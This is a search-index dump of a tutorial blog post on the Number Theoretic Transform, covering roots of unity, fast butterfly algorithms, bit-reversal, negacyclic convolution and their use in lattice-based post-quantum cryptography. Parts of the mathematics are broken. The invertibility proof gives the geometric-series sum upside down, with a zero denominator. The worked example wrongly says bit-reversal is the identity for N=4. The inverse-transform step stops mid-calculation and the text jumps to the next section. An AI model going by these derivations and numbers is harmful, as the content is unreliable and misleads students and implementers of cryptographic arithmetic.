","date":"2025-08-09","objectID":"/waytontt-part-0/:2:5","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The Number Theoretic Transform (NTT): Principles and Theory The convolution theorem provides a path to transform a computationally intensive convolution in the time or spatial domain into a simple pointwise product in the frequency domain. The Number Theoretic Transform (NTT) is an adaptation of this principle to the realm of finite fields, designed to achieve the speed of transform-based methods while preserving the exactness required for integer arithmetic. It achieves this by being a fundamental change of basis for the vector space of polynomials. The NTT transforms a polynomial from the standard monomial basis (coefficients of $1, x, x^2, \\ldots$) to a basis of evaluation points (values at $\\omega^0, \\omega^1, \\ldots$). Multiplication, which is complex (convolution) in the monomial basis, becomes simple (pointwise) in the evaluation basis. The Inverse NTT (INTT) is the transformation back to the standard basis. ","date":"2025-08-09","objectID":"/waytontt-part-0/:3:0","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"From DFT to NTT: The Quest for Exact Integer Arithmetic The journey to the NTT begins with its more famous counterpart, the Discrete Fourier Transform (DFT). The DFT and the Convolution Theorem The DFT is a mathematical transform that decomposes a finite sequence of values into a sequence of complex numbers representing different frequency components. The cornerstone of its utility for fast computation is the Convolution Theorem, which states that the DFT of a cyclic convolution of two sequences is equal to the pointwise (or Hadamard) product of their individual DFTs: $$\\mathcal{F}(f * g) = \\mathcal{F}(f) \\odot \\mathcal{F}(g)$$This theorem allows one to replace a costly $O(n^2)$ convolution with two forward transforms, one pointwise product ($O(n)$), and one inverse transform. When the transforms are computed using the Fast Fourier Transform (FFT) algorithm, the total complexity becomes $O(n \\log n)$. The Problem with Floating-Point Arithmetic The DFT and FFT operate over the field of complex numbers, $\\mathbb{C}$. On digital hardware, these numbers are represented using finite-precision floating-point arithmetic. This inevitably introduces small rounding and precision errors at each step of the computation. While these errors are often negligible in applications like audio or image processing, they are completely unacceptable in contexts where results must be perfectly exact, such as in cryptography or when multiplying large integers. A single bit error in a cryptographic key or ciphertext can render it useless or insecure. The NTT as an Analogue The Number Theoretic Transform (NTT) was developed to overcome this limitation. It is a generalization of the DFT that operates over a finite field, typically the integers modulo a prime, $\\mathbb{Z}_q$, instead of the complex numbers. The core idea is to replace the complex primitive $n$-th roots of unity, $e^{-2\\pi i/n}$, with primitive $n$-th roots of unity that exist within the finite field itself. Because all operations (additions, multiplications) are performed using modular integer arithmetic, the entire transform is computed without any loss of precision, yielding perfectly exact results. ","date":"2025-08-09","objectID":"/waytontt-part-0/:3:1","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Comparison Table Property Discrete Fourier Transform (DFT) Number Theoretic Transform (NTT) Domain Complex Numbers ($\\mathbb{C}$) Finite Field ($\\mathbb{Z}_q$) Arithmetic Floating-Point Integer Modulo $q$ Roots of Unity $e^{-2\\pi i/n}$ $\\omega \\in \\mathbb{Z}_q$ where $\\omega^n \\equiv 1 \\pmod{q}$ Precision Approximate (subject to rounding errors) Exact (error-free) Key Advantage Widely applicable in physical sciences Error-free computation for digital systems Key Limitation Precision errors Requires specific prime moduli ($q \\equiv 1 \\pmod{n}$) Typical Application Signal/Image Processing, Digital Filtering Cryptography, Large Number Multiplication ","date":"2025-08-09","objectID":"/waytontt-part-0/:3:2","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The Cornerstone: Primitive n-th Roots of Unity in Finite Fields The entire theory of the NTT rests on the existence and properties of roots of unity within a finite field. Definition A primitive $n$-th root of unity in a finite field $\\mathbb{Z}_q$ is an element $\\omega \\in \\mathbb{Z}_q$ that satisfies two conditions: $\\omega^n \\equiv 1 \\pmod{q}$ $\\omega^k \\not\\equiv 1 \\pmod{q}$ for all integers $1 \\leq k \u003c n$ The first condition states that $\\omega$ is an $n$-th root of unity. The second, more stringent condition ensures it is “primitive,” meaning its powers $\\omega^0, \\omega^1, \\ldots, \\omega^{n-1}$ generate all $n$ distinct $n$-th roots of unity, forming a cyclic subgroup of order $n$. The Existence Condition The existence of such an element is not guaranteed for any arbitrary choice of $n$ and $q$. A fundamental theorem of number theory provides the necessary and sufficient condition: Theorem: For a prime $q$, a primitive $n$-th root of unity exists in the finite field $\\mathbb{Z}_q$ if and only if $n$ divides $q - 1$. Proof of Existence This theorem is central to the NTT and warrants a formal proof. Part 1 (If $\\omega$ exists, then $n \\mid (q-1)$): Assume a primitive $n$-th root of unity, $\\omega$, exists in $\\mathbb{Z}_q$. The set of its powers, ${\\omega^0, \\omega^1, \\ldots, \\omega^{n-1}}$, forms a cyclic subgroup of order $n$ within the multiplicative group of non-zero elements, $\\mathbb{Z}_q^*$. The order (size) of this multiplicative group is $q - 1$. By Lagrange’s theorem, the order of any subgroup must divide the order of the group. Therefore, $n$ must divide $q - 1$. Part 2 (If $n \\mid (q-1)$, then $\\omega$ exists): Assume $n$ divides $q - 1$. It is a known result from finite field theory that the multiplicative group $\\mathbb{Z}_q^*$ is cyclic for any prime $q$. This means there exists a generator (or primitive root) $g \\in \\mathbb{Z}_q^{*}$ such that its powers generate the entire group. The order of $g$ is $q - 1$. Let’s define an element $\\omega$ as: $\\omega = g^{(q-1)/n} \\pmod{q}$ We must show that $\\omega$ is a primitive $n$-th root of unity. First, we check that it is an $n$-th root of unity: $\\omega^n = (g^{(q-1)/n})^n = g^{q-1} \\equiv 1 \\pmod{q}$ This follows from Fermat’s Little Theorem, which states that $g^{q-1} \\equiv 1 \\pmod{q}$ for any non-zero $g \\in \\mathbb{Z}_q$. Second, we must show it is primitive. Let $k$ be the order of $\\omega$. We know that $k$ must divide $n$. Suppose, for the sake of contradiction, that $k \u003c n$. Then $\\omega^k = g^{k(q-1)/n} \\equiv 1 \\pmod{q}$. Since $g$ is a generator of $\\mathbb{Z}_q^*$, its order is $q - 1$. Therefore, for $g^m \\equiv 1$, it must be that $q - 1$ divides $m$. In our case, this means $q - 1$ must divide $k(q-1)/n$. This implies that $n$ must divide $k$. But we assumed $k \u003c n$, and since $k$ is a positive integer, this is a contradiction. Therefore, the order of $\\omega$ must be exactly $n$, making it a primitive $n$-th root of unity. ","date":"2025-08-09","objectID":"/waytontt-part-0/:3:3","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The NTT and its Inverse: Formal Definitions and Correctness With the existence of a primitive root of unity established, we can formally define the NTT and its inverse. Forward NTT Let $a = [a_0, a_1, \\ldots, a_{n-1}]$ be a vector of elements in $\\mathbb{Z}_q$. Its forward Number Theoretic Transform, $\\hat{a} = \\text{NTT}(a)$, is a vector $\\hat{a} = [\\hat{a}_0, \\hat{a}_1, \\ldots, \\hat{a}_{n-1}]$ where each component is defined as: $$\\hat{a}\\_k = \\sum_{j=0}^{n-1} a\\_j \\omega^{jk} \\pmod{q}$$This transformation is linear and can be represented as a matrix-vector product, $\\hat{a} = Wa$, where $W$ is an $n \\times n$ matrix with entries $W_{kj} = \\omega^{jk}$. This is a Vandermonde matrix constructed from the powers of $\\omega$. Inverse NTT (INTT) The inverse transform, $a = \\text{INTT}(\\hat{a})$, is defined as: $a_j = n^{-1} \\sum_{k=0}^{n-1} \\hat{a}_k \\omega^{-jk} \\pmod{q}$ This formula requires the existence of $n^{-1}$, the multiplicative inverse of $n$ modulo $q$. This inverse exists if and only if $\\gcd(n, q) = 1$. Since $q$ is prime and the existence condition for $\\omega$ requires $n \\mid (q-1)$, we know $n \u003c q$, so $\\gcd(n, q) = 1$ is guaranteed. Proof of Invertibility To prove that the INTT is indeed the inverse of the NTT, we substitute the definition of $\\hat{a}_k$ into the INTT formula: $a_j = n^{-1} \\sum_{k=0}^{n-1} \\left(\\sum_{l=0}^{n-1} a_l \\omega^{lk}\\right) \\omega^{-jk} \\pmod{q}$ Rearranging the order of summation: $a_j = n^{-1} \\sum_{l=0}^{n-1} a_l \\left(\\sum_{k=0}^{n-1} \\omega^{(l-j)k}\\right) \\pmod{q}$ The inner sum is a geometric series of roots of unity. Let $\\delta = l - j$. The sum is $\\sum_{k=0}^{n-1} (\\omega^\\delta)^k$. Case 1: $l = j$ ($\\delta = 0$): The term $\\omega^\\delta = \\omega^0 = 1$. The sum becomes $\\sum_{k=0}^{n-1} 1 = n$. Case 2: $l \\neq j$ ($\\delta \\neq 0$): Since $\\omega$ is a primitive $n$-th root of unity and $0 \u003c |l - j| \u003c n$, $\\omega^\\delta \\neq 1$. The sum of the geometric series is $\\frac{\\omega^\\delta - 1}{(\\omega^\\delta)^n - 1} = \\frac{\\omega^\\delta - 1}{(\\omega^n)^\\delta - 1} = \\frac{\\omega^\\delta - 1}{1^\\delta - 1} = 0$. Therefore, the inner sum is non-zero only when $l = j$, in which case it equals $n$. The expression simplifies to: $a_j = n^{-1} (a_j \\cdot n) = a_j \\pmod{q}$ This confirms that the INTT is indeed the inverse of the NTT. ","date":"2025-08-09","objectID":"/waytontt-part-0/:3:4","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The Convolution Theorem in Finite Fields The primary motivation for using the NTT is its ability to simplify convolutions. Statement and Interpretation The Cyclic Convolution Theorem for NTT states that the NTT of a cyclic convolution of two vectors is the pointwise product of their individual NTTs: $\\text{NTT}(a \\circledast b) = \\text{NTT}(a) \\odot \\text{NTT}(b)$ This allows for the computation of a cyclic convolution via the procedure: $c = \\text{INTT}(\\text{NTT}(a) \\odot \\text{NTT}(b))$. A powerful way to understand this theorem is through the lens of polynomial evaluation. The forward NTT of a coefficient vector $a$ is equivalent to evaluating its corresponding polynomial $A(x) = \\sum a_j x^j$ at the $n$ distinct points given by the powers of the primitive root of unity: $\\hat{a}_k = A(\\omega^k)$ The vector $\\hat{a}$ is thus the representation of the polynomial in the “evaluation” or “frequency” domain. Proof of the Theorem This interpretation provides an elegant proof of the convolution theorem. Let $A(x)$, $B(x)$, and $C(x)$ be polynomials corresponding to vectors $a$, $b$, and their cyclic convolution $c = a \\circledast b$. By the algebraic isomorphism discussed in Section 1.2, polynomial multiplication in the ring $\\mathbb{Z}_q[x]/(x^n - 1)$ is equivalent to cyclic convolution of the coefficients. Therefore, $C(x) = A(x)B(x) \\pmod{x^n - 1}$. Let’s compute the NTT of $c$: $\\hat{c}_k = C(\\omega^k)$ Since $\\omega$ is an $n$-th root of unity, $\\omega^n = 1$, which means $\\omega$ is a root of the polynomial $x^n - 1$. Therefore, evaluating the polynomial product at $\\omega^k$ does not require the modulo operation: $C(\\omega^k) = (A(x)B(x) \\pmod{x^n - 1})|_{x=\\omega^k} = A(\\omega^k)B(\\omega^k)$ We recognize that $A(\\omega^k) = \\hat{a}_k$ and $B(\\omega^k) = \\hat{b}_k$. Thus: $\\hat{c}_k = \\hat{a}_k \\cdot \\hat{b}_k$ This is precisely the definition of the pointwise product. We have shown that $\\text{NTT}(c) = \\text{NTT}(a) \\odot \\text{NTT}(b)$, completing the proof. ","date":"2025-08-09","objectID":"/waytontt-part-0/:3:5","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"High-Performance Computation: Fast NTT Algorithms The theoretical framework of the NTT provides a path to exact, fast convolution. However, its practical utility hinges on the existence of an algorithm to compute the transform itself in less than the naive $O(n^2)$ time. The Cooley-Tukey algorithm, a cornerstone of digital signal processing, provides such a method by applying the “divide-and-conquer” principle. The duality between its two main variants, Decimation-in-Time (DIT) and Decimation-in-Frequency (DIF), enables highly optimized implementations that are crucial for performance-critical applications. ","date":"2025-08-09","objectID":"/waytontt-part-0/:4:0","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The Divide-and-Conquer Paradigm: The Cooley-Tukey Algorithm The efficiency of fast transform algorithms stems from the divide-and-conquer strategy, which solves a problem by recursively breaking it into smaller instances of the same problem and combining their solutions. Core Principle The Cooley-Tukey FFT algorithm, which applies directly to the NTT, re-expresses an NTT of a composite size $N = N_1 N_2$ in terms of smaller NTTs of sizes $N_1$ and $N_2$. When $N$ is a power of two, $N = 2^k$, this decomposition can be applied recursively, repeatedly halving the problem size. This recursive structure is what reduces the computational complexity from $O(N^2)$ to $O(N \\log N)$. Derivation for Radix-2 DIT The Radix-2 Decimation-in-Time (DIT) variant is derived by splitting the input sequence into its even-indexed and odd-indexed elements. Starting with the NTT definition: $$\\hat{a}\\_k = \\sum_{j=0}^{N-1} a_j \\omega_N^{jk}$$We can separate the sum over even and odd indices by letting $j = 2m$ for the even part and $j = 2m + 1$ for the odd part: We can separate the sum over even and odd indices by letting $j = 2m$ for the even part and $j = 2m + 1$ for the odd part: $$\\hat{a}\\_{k} = \\sum_{m=0}^{N/2-1} a_{2m} \\omega_N^{(2m)k} + \\sum_{m=0}^{N/2-1} a_{2m+1} \\omega_N^{(2m+1)k}$$Using the identity $\\omega_N^2 = \\omega_{N/2}$, we can rewrite the terms: $$\\begin{align} \\hat{a}\\_{k} \u0026= \\sum_{m=0}^{N/2-1} a_{2m} (\\omega_N^2)^{mk} + \\omega_N^k \\sum_{m=0}^{N/2-1} a_{2m+1} (\\omega_N^2)^{mk} \\\\\\\\ \u0026= \\sum_{m=0}^{N/2-1} a_{2m} \\omega_{N/2}^{mk} + \\omega_N^k \\cdot \\sum_{m=0}^{N/2-1} a_{2m+1} \\omega_{N/2}^{mk} \\end{align}$$The first sum represents the NTT of the even-indexed elements, and the second sum represents the NTT of the odd-indexed elements. Let us define: $\\hat{a}_{k}^{\\text{even}} = \\text{NTT}(a_{\\text{even}})$ (NTT of even-indexed elements) $\\hat{a}_{k}^{\\text{odd}} = \\text{NTT}(a_{\\text{odd}})$ (NTT of odd-indexed elements) Then the formula becomes: $$\\hat{a}\\_{k} = \\hat{a}\\_{k}^{\\text{even}} + \\omega_N^k \\cdot \\hat{a}_{k}^{\\text{odd}}$$This computes the first half of the output transform ($0 \\leq k \u003c N/2$). For the second half ($N/2 \\leq k \u003c N$), we can let $k^\\prime = k - N/2$. Using the identities $\\omega_N^{k+N/2} = \\omega_N^k \\omega_N^{N/2} = -\\omega_N^k$ and the periodicity of the smaller transforms ($\\hat{a}_{k+N/2}^{\\text{even}} = \\hat{a}_k^{\\text{even}}$), we get: $$\\hat{a}_{k+N/2} = \\hat{a}_k^{\\text{even}} - \\omega_N^k \\cdot \\hat{a}_k^{\\text{odd}}$$These two equations form the core of the recursive algorithm. ","date":"2025-08-09","objectID":"/waytontt-part-0/:4:1","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The Butterfly Operation: The Heart of the FFT/NTT The “butterfly” is the fundamental computational unit that implements the combination step of the Cooley-Tukey algorithm. It takes two input values and produces two output values, with its data-flow diagram resembling the shape of a butterfly’s wings. Cooley-Tukey (DIT) Butterfly The pair of equations derived above defines the Cooley-Tukey or DIT butterfly. For each index $k$ from $0$ to $N/2 - 1$, it takes an element from the even-part transform ($\\hat{a}_k^{\\text{even}}$) and an element from the odd-part transform ($\\hat{a}_k^{\\text{odd}}$), combines them using a “twiddle factor” $\\omega_N^k$, and produces two outputs for the full transform, $\\hat{a}_{k}$ and $\\hat{a}_{k+N/2}$. $$\\begin{cases} \\hat{a}\\_k \\leftarrow \\hat{a}\\_k^{\\text{even}} + \\omega_N^k \\cdot \\hat{a}\\_k^{\\text{odd}} \\\\\\\\ \\hat{a}\\_{k+N/2} \\leftarrow \\hat{a}\\_k^{\\text{even}} - \\omega_N^k \\cdot \\hat{a}\\_k^{\\text{odd}} \\end{cases}$$A diagram of this operation shows two inputs on the left, two outputs on the right, with lines crossing in the middle, one path involving a multiplication by the twiddle factor. Gentleman-Sande (DIF) Butterfly The Gentleman-Sande (GS) or Decimation-in-Frequency (DIF) algorithm is the computational dual of the DIT algorithm. It splits the output (frequency domain) sequence rather than the input (time domain) sequence. Its butterfly operation precedes the recursive calls and has a different structure: $$\\begin{cases} y_0 \\leftarrow x_0 + x_1 \\\\\\\\ y_1 \\leftarrow (x_0 - x_1) \\cdot \\omega_N^k \\end{cases}$$The GS butterfly is often preferred for implementing the inverse NTT (INTT). The DIT and DIF algorithms are computationally duals: a DIT forward transform naturally pairs with a DIF inverse transform. The DIT algorithm typically takes natural-ordered input and produces bit-reversed output, while the DIF algorithm takes bit-reversed input and produces natural-ordered output. When performing convolution via $c = \\text{INTT}(\\text{NTT}(a) \\odot \\text{NTT}(b))$, one can use a DIT for the forward NTTs and a DIF for the inverse INTT. The bit-reversed output of the DIT-based NTTs becomes the correctly ordered input for the DIF-based INTT, eliminating the need for an explicit bit-reversal permutation between the forward and inverse transforms. This pairing saves a full pass over the data, a significant optimization in high-performance implementations. ","date":"2025-08-09","objectID":"/waytontt-part-0/:4:2","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Data Ordering and In-Place Computation: The Bit-Reversal Permutation The recursive even-odd splitting at the heart of the Cooley-Tukey DIT algorithm has a peculiar side effect on the data ordering. The Scrambling Effect If one traces the indices through the recursive DIT decomposition, the input elements are effectively reordered according to a bit-reversal permutation. For an in-place algorithm that overwrites its input buffer, this means that to get a naturally ordered output, the input must first be placed in bit-reversed order. Conversely, if the input is in natural order, the output will be in bit-reversed order. What is Bit-Reversal? The bit-reversal permutation of an index is found by writing its binary representation and reversing the order of the bits. For example, for a transform of size $N = 8$, the indices are represented by 3 bits. The index 3 is 011 in binary. Reversing the bits gives 110, which is the decimal value 6. Thus, the element at index 3 is swapped with the element at index 6. Natural Index Binary Reversed Binary Bit-Reversed Index 0 000 000 0 1 001 100 4 2 010 010 2 3 011 110 6 4 100 001 1 5 101 101 5 6 110 011 3 7 111 111 7 In-Place Algorithms The primary motivation for dealing with bit-reversal is to enable in-place computation, which saves memory. Instead of allocating new arrays for the outputs of each recursive stage, an in-place algorithm overwrites the input buffer. A common strategy is to first apply the bit-reversal permutation to the entire input array. After this initial reordering, all subsequent butterfly stages can be computed in-place, and the final output will be in natural (sequential) order. ","date":"2025-08-09","objectID":"/waytontt-part-0/:4:3","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"A Step-by-Step Numerical Example: Polynomial Multiplication via Fast NTT Let’s perform a complete polynomial multiplication using a fast NTT, combining all the concepts discussed. We will compute the product of $A(x) = 2x^2 + x + 1$ and $B(x) = 3x^2 + 4x + 2$ in the ring $\\mathbb{Z}_{17}[x]/(x^4 - 1)$. 1. Parameter Setup: Polynomial length $N = 4$. The coefficient vectors are $a = [1, 1, 2, 0]$ and $b = [2, 4, 3, 0]$. Modulus $q = 17$. We check the existence condition: $N = 4$ must divide $q - 1 = 16$. $16/4 = 4$, so the condition holds. Primitive 4th root of unity: We need $\\omega \\in \\mathbb{Z}_{17}$ such that $\\omega^4 \\equiv 1$ and $\\omega^2 \\not\\equiv 1$. Let’s try $\\omega = 4$. $\\omega^1 = 4 \\pmod{17}$ $\\omega^2 = 16 \\equiv -1 \\pmod{17}$ $\\omega^3 = 64 \\equiv 13 \\pmod{17}$ $\\omega^4 = 256 \\equiv 1 \\pmod{17}$. Since $\\omega^2 \\not\\equiv 1$, $\\omega = 4$ is a primitive 4th root of unity. The required twiddle factors are $\\omega^0 = 1, \\omega^1 = 4$. 2. Forward NTT (Cooley-Tukey DIT): We will use a natural-order input, in-place algorithm, which will produce a bit-reversed output. Input vectors: $a = [1, 1, 2, 0]$ and $b = [2, 4, 3, 0]$. Stage 1 (Butterflies of size 2): For vector $a$: Pair $(a_{0}, a_{2})$: $$\\begin{aligned} t \u0026= a_{0} + a_{2} = 1 + 2 = 3 \\\\\\\\ a_{2} \u0026= a_{0} - a_{2} = 1 - 2 = -1 \\equiv 16 \\pmod{17} \\end{aligned}$$ New $a = [3, 1, 16, 0]$. Pair $(a_{1}, a_{3})$: $$\\begin{aligned} t \u0026= a_{1} + a_{3} = 1 + 0 = 1 \\\\\\\\ a_{3} \u0026= a_{1} - a_{3} = 1 - 0 = 1 \\end{aligned}$$ New $a = [3, 1, 16, 1]$. For vector $b$: Pair $(b_{0}, b_{2})$: $$\\begin{aligned} t \u0026= b_{0} + b_{2} = 2 + 3 = 5 \\\\\\\\ b_{2} \u0026= b_{0} - b_{2} = 2 - 3 = -1 \\equiv 16 \\pmod{17} \\end{aligned}$$ New $b = [5, 4, 16, 0]$. Pair $(b_{1}, b_{3})$: $$\\begin{aligned} t \u0026= b_{1} + b_{3} = 4 + 0 = 4 \\\\\\\\ b_{3} \u0026= b_{1} - b_{3} = 4 - 0 = 4 \\end{aligned}$$ New $b = [5, 4, 16, 4]$. Stage 2 (Butterflies of size 4): For vector $a = [3, 1, 16, 1]$: Pair $(a_{0}, a_{1})$ with twiddle factor $\\omega^{0} = 1$: $$\\begin{aligned} t \u0026= a_{0} + 1 \\cdot a_{1} = 3 + 1 = 4 \\\\\\\\ a_{1} \u0026= a_{0} - 1 \\cdot a_{1} = 3 - 1 = 2 \\end{aligned}$$ Pair $(a_{2}, a_{3})$ with twiddle factor $\\omega^{1} = 4$: $$\\begin{aligned} t \u0026= a_{2} + 4 \\cdot a_{3} = 16 + 4 \\cdot 1 = 20 \\equiv 3 \\pmod{17} \\\\\\\\ a_{3} \u0026= a_{2} - 4 \\cdot a_{3} = 16 - 4 = 12 \\end{aligned}$$Final $a = [4, 2, 3, 12]$. For vector $b = [5, 4, 16, 4]$: Pair $(b_{0}, b_{1})$ with twiddle factor $\\omega^{0} = 1$: $$\\begin{aligned} t \u0026= b_{0} + 1 \\cdot b_{1} = 5 + 4 = 9 \\\\\\\\ b_{1} \u0026= b_{0} - 1 \\cdot b_{1} = 5 - 4 = 1 \\end{aligned}$$ Pair $(b_{2}, b_{3})$ with twiddle factor $\\omega^{1} = 4$: $$\\begin{aligned} t \u0026= b_{2} + 4 \\cdot b_{3} = 16 + 4 \\cdot 4 = 32 \\equiv 15 \\pmod{17} \\\\\\\\ b_{3} \u0026= b_{2} - 4 \\cdot b_{3} = 16 - 16 = 0 \\end{aligned}$$Final $b = [9, 1, 15, 0]$. Final NTT vectors (in bit-reversed order): $$\\hat{a}\\_{br} = [4, 2, 3, 12]$$$$\\hat{b}\\_{br} = [9, 1, 15, 0]$$Note: Since we used natural-order input with the DIT algorithm, the output is in bit-reversed order. The natural order would be the same: $\\hat{a} = [4, 2, 3, 12]$ and $\\hat{b} = [9, 1, 15, 0]$ (for $N=4$, bit-reversal is identity). 3. Pointwise Multiplication: We multiply the bit-reversed vectors component-wise. $\\hat{c}_{br}[0] = 4 \\cdot 9 = 36 \\equiv 2 \\pmod{17}$ $\\hat{c}_{br}[1] = 2 \\cdot 1 = 2 \\pmod{17}$ $\\hat{c}_{br}[2] = 3 \\cdot 15 = 45 \\equiv 11 \\pmod{17}$ $\\hat{c}_{br}[3] = 12 \\cdot 0 = 0 \\pmod{17}$ $\\hat{c}_{br} = [2, 2, 11, 0]$ 4. Inverse NTT (Gentleman-Sande DIF): We will use a bit-reversed input, in-place algorithm, which will produce a natural-order output. Twiddle factor calculation: The twiddle factors use $\\omega^{-1} = 4^{-1} \\pmod{17}$. Since $4 \\cdot 13 = 52 = 3 \\cdot 17 + 1$, we have $\\omega^{-1} = 13$. Therefore: $(\\omega^{-1})^{0} = 1$ and $(\\omega^{-1})^{1} = 13$. Input vector: $\\hat{c}_{br} = [2, 2, 11, 0]$. Stage 1 (Butterflies of size 4): Pair $(\\hat{c}_{0}, \\hat{c}_{2})$: $$\\begin{aligned} t \u0026= \\hat{c}\\_{0} + \\hat{c}\\_{2} = 2 + 11 = 1","date":"2025-08-09","objectID":"/waytontt-part-0/:4:4","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Negacyclic Convolution with NTT: The Cryptographer’s Toolkit While the NTT is naturally suited for cyclic convolution, the premier applications in modern cryptography are built upon negacyclic convolution, corresponding to multiplication in the ring $\\mathbb{Z}_q[x]/(x^n + 1)$. A direct application of the standard NTT would produce an incorrect result. Fortunately, a clever and efficient adaptation exists that allows the powerful NTT machinery to be used for this crucial case. This adaptation is not merely an ad-hoc “trick” but a concrete implementation of a ring isomorphism, mapping the negacyclic problem into a cyclic one that the NTT can solve, and then mapping the result back. ","date":"2025-08-09","objectID":"/waytontt-part-0/:5:0","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The Challenge: Adapting NTT for the Ring $\\mathbb{Z}_q[x]/(x^n + 1)$ The fundamental structure of the NTT is based on the properties of $n$-th roots of unity, which are the roots of the polynomial $x^n - 1$. This algebraic foundation means the NTT naturally computes polynomial products modulo $x^n - 1$, which is cyclic convolution. Attempting to multiply polynomials from the ring $\\mathbb{Z}_q[x]/(x^n + 1)$ using this machinery directly will fail because the wrap-around rule is different ($x^n \\equiv -1$, not $x^n \\equiv 1$). ","date":"2025-08-09","objectID":"/waytontt-part-0/:5:1","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The Solution: The Role of the $2n$-th Root of Unity The standard solution involves embedding the $n$-point negacyclic convolution within a larger, $2n$-point cyclic convolution. This is possible due to the algebraic identity $x^{2n} - 1 = (x^n - 1)(x^n + 1)$. This factorization allows a mapping between the two algebraic worlds. The most common implementation of this mapping involves pre- and post-processing steps that “twist” the data into a form suitable for a cyclic NTT. Let $\\psi$ be a primitive $2n$-th root of unity in $\\mathbb{Z}_{q}$. Note that $\\psi^2 = \\omega$ is a primitive $n$-th root of unity. The procedure to compute the negacyclic convolution $c = a \\circledast_{-} b$ is as follows: Pre-processing (Twisting): Take the input coefficient vectors $a$ and $b$ of length $n$. Create two new vectors, $a^\\prime$ and $b^\\prime$, by multiplying each coefficient by the corresponding power of $\\psi$: $a^\\prime_i = a_i \\cdot \\psi^i \\pmod{q} \\quad \\text{for } i = 0, \\dots, n-1$ $b^\\prime_i = b_i \\cdot \\psi^i \\pmod{q} \\quad \\text{for } i = 0, \\dots, n-1$ Cyclic Convolution via NTT: Compute the $n$-point cyclic convolution of the twisted vectors $a^\\prime$ and $b^\\prime$. This is done efficiently using the standard NTT based on the primitive $n$-th root of unity $\\omega = \\psi^2$. $c^\\prime = \\text{INTT}(\\text{NTT}(a^\\prime) \\odot \\text{NTT}(b^\\prime))$ Post-processing (Untwisting): Take the resulting vector $c^\\prime$ and multiply each coefficient by the corresponding inverse power of $\\psi$ to obtain the final result $c$: $c_i = c^\\prime_i \\cdot \\psi^{-i} \\pmod{q} \\quad \\text{for } i = 0, \\ldots, n-1$ This three-step process correctly computes the product of two polynomials in $\\mathbb{Z}_q[x]/(x^n + 1)$ using the machinery of an $n$-point NTT designed for $\\mathbb{Z}_q[x]/(x^n - 1)$. The mathematical derivation shows that the “twisting” factors correctly account for the sign change required by the negacyclic structure. ","date":"2025-08-09","objectID":"/waytontt-part-0/:5:2","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Parameter Constraints for Negacyclic NTT This elegant solution introduces a stricter requirement on the system parameters. The pre- and post-processing steps depend on the existence of a primitive $2n$-th root of unity, $\\psi$. According to the existence theorem from Section 2.2, for such a root to exist in the finite field $\\mathbb{Z}_q$, the modulus $q$ must satisfy the condition: $2n \\mid (q-1) \\quad \\text{or} \\quad q \\equiv 1 \\pmod{2n}$ This condition is twice as restrictive as the one for the standard cyclic NTT ($n \\mid (q-1)$). This constraint has profound implications for the design of lattice-based cryptosystems. Cryptographers must select prime moduli that are not only large enough for security and small enough for efficiency, but also have this specific algebraic property to enable the use of the fastest known polynomial multiplication algorithms. This delicate balancing act is a central theme in the practical implementation of post-quantum cryptography. ","date":"2025-08-09","objectID":"/waytontt-part-0/:5:3","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"Application Spotlight: Post-Quantum Cryptography The abstract mathematical machinery of convolutions and number theoretic transforms finds its most critical modern application in the field of post-quantum cryptography (PQC). The transition to quantum-resistant algorithms is one of the most significant security upgrades in the history of computing, and the performance of these new systems hinges directly on the efficient implementation of polynomial arithmetic. The design of modern PQC schemes is not a linear process where a cryptosystem is created and an algorithm is later found to implement it; it is a sophisticated co-design, where the choice of algebraic structures is motivated by security, while the selection of numerical parameters is a delicate balance between security, correctness, and the specific requirements of algorithms like the NTT. ","date":"2025-08-09","objectID":"/waytontt-part-0/:6:0","tags":[],"title":"WayToNTT Part 0","uri":"/waytontt-part-0/"},{"categories":[],"content":"The Need for Speed: Polynomial Multiplication in Lattice-Based Cryptography The impending threat of large-scale quantum computers, which can efficiently break current public-key standards like RSA and ECC using Shor’s algorithm, has necessitated the development of new cryptographic foundations. Lattices and PQC Lattice-based cryptography has emerged as one of the most promising families of PQC candidates. Its security is based on the presumed hardness of certain mathematical problems on high-dimensional lattices, such as the Learning With Errors (LWE) and Ring-Learning With Errors (RLWE) problems. These problems are believed to be resistant to attack by both classical and quantum computers. The Performance Bottleneck A key feature of many lattice-based schemes, particularly those based on RLWE, is that their core operations involve arithmetic in polynomial quotient rings, such as $\\mathbb{Z}_q[x]/(x^n + 1)$. The most frequent and computationally intensive operation in these schemes—including key generation, encapsulation, and decapsulation—is the multiplication of large-degree polynomials. For the security levels required for modern applications, the polynomial degree $n$ is typically in the range of 256 to 1024. Using a naive schoolbook multiplication algorithm with $O(n^2)$ complexity would render these schemes too slow for practical use, especially in resource-constrained environments like embedded systems or high-throughput servers. NTT as the Enabler The Number Theoretic Transform is the crucial enabling technology that makes these schemes practical. By reducing the complexity of polynomial multiplication to $O(n \\log n)$, the NTT provides a speedup of one to two orders of magnitude, transforming a theoretical curiosity into a deployable technology. The performance of schemes like the NIST-standardized CRYSTALS-Kyber and Dilithium is fundamentally reliant on highly optimized NTT implementations. ","date":"2025-08-09","objectID":"/waytontt-part-0/:6:1","tags":[],"title":"WayToNTT Part 